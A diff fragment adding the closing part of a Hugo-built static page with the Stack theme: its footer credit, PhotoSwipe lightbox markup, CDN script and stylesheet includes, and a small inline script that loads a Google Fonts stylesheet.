+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.59729e8016d63fb571847b33800c7f0e48c9acdb8eaed3eec3e94d3bcad55aca.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
